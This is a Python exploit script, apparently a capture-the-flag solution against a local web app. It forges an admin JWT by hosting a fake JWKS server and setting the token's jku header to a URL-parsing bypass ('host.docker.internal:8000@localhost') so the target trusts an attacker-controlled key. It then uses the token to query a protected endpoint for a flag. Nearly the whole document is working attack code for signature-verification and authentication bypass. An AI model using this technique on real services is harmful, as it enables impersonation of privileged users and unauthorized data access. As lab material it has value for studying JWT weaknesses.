import jwt
import requests
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import json

# Generate RSA key pair for our fake JKU server
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# Export keys
private_key_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
).decode()

public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode()

# Get modulus and exponent for JWK
public_numbers = public_key.public_numbers()
n = public_numbers.n
e = public_numbers.e

# Convert to base64url format (without padding)
import base64

def int_to_base64url(value):
    """Convert integer to base64url-encoded string"""
    byte_length = (value.bit_length() + 7) // 8
    value_bytes = value.to_bytes(byte_length, byteorder='big')
    return base64.urlsafe_b64encode(value_bytes).decode().rstrip('=')

n_b64 = int_to_base64url(n)
e_b64 = int_to_base64url(e)

# Get the legitimate kid from the target server
try:
    response = requests.get('http://localhost:1337/.well-known/jwks.json')
    legitimate_jwks = response.json()
    kid = legitimate_jwks['keys'][0]['kid']
    print(f"[+] Retrieved legitimate kid: {kid}")
except Exception as e:
    print(f"[-] Failed to get legitimate kid: {e}")
    kid = "9f82f66c-62e5-43b8-8d41-e1b245d7eb6a"  # Fallback

# Our malicious JWKS that we'll serve
fake_jwks = {
    "keys": [
        {
            "kty": "RSA",
            "kid": kid,
            "use": "sig",
            "alg": "RS256",
            "n": n_b64,
            "e": e_b64
        }
    ]
}

# HTTP server to serve our fake JWKS
class JWKSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/.well-known/jwks.json':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(fake_jwks).encode())
            print(f"[+] Served fake JWKS to {self.client_address[0]}")
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        return  # Suppress default logging

# Start the fake JWKS server on port 8000
def start_fake_server():
    server = HTTPServer(('0.0.0.0', 8000), JWKSHandler)
    print("[+] Fake JWKS server started on http://0.0.0.0:8000")
    server.serve_forever()

server_thread = threading.Thread(target=start_fake_server, daemon=True)
server_thread.start()

# Give the server time to start
import time
time.sleep(1)

# Get host IP address (Docker containers need to use host.docker.internal or host IP)
# For Docker on Windows, use host.docker.internal
# For Linux Docker, use 172.17.0.1
import socket
try:
    # Try to get the actual IP
    hostname = socket.gethostname()
    host_ip = socket.gethostbyname(hostname)
    print(f"[+] Host IP: {host_ip}")
except:
    host_ip = "172.17.0.1"
    print(f"[+] Using default Docker host IP: {host_ip}")

# Create forged JWT token pointing to our malicious JKU
# The key is to use URL parsing inconsistency
# requests library will accept: http://attacker.com@victim.com and go to attacker.com
# But the regex validation might pass it thinking it's victim.com

# Payload for the JWT
payload = {
    'username': 'admin',
    'session': 'forged_session_12345'
}

# Headers with jku pointing to our malicious JWKS server
# Using URL parsing bypass: http://host.docker.internal:8000@localhost
headers = {
    'kid': kid,
    'alg': 'RS256',
    'jku': f'http://host.docker.internal:8000@localhost/.well-known/jwks.json'
}

# Encode the JWT with our private key
forged_token = jwt.encode(payload, private_key, algorithm='RS256', headers=headers)
print(f"\n[+] Forged JWT token: {forged_token}")

# Test the forged token
print("\n[+] Testing forged token against /api/list endpoint...")
cookies = {'auth': forged_token}

try:
    response = requests.get('http://localhost:1337/api/list', cookies=cookies)
    print(f"[+] Response status: {response.status_code}")
    print(f"[+] Response headers: {dict(response.headers)}")
    print(f"[+] Response body: {response.text}")
    
    if response.status_code == 200:
        print("\n[SUCCESS] Token accepted! Response:")
        data = response.json()
        print(json.dumps(data, indent=2))
        
        # Look for the flag in submissions
        if 'submissions' in data:
            print("\n[+] Checking submissions for flag...")
            for submission in data['submissions']:
                print(f"  - User: {submission.get('user', 'unknown')}")
                print(f"    Idea: {submission.get('idea', 'N/A')}")
    else:
        print(f"\n[-] Token rejected with status {response.status_code}")
        
except Exception as e:
    print(f"[-] Error: {e}")

# Keep server running
print("\n[+] Fake JWKS server is running. Press Ctrl+C to exit.")
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[-] Shutting down...")
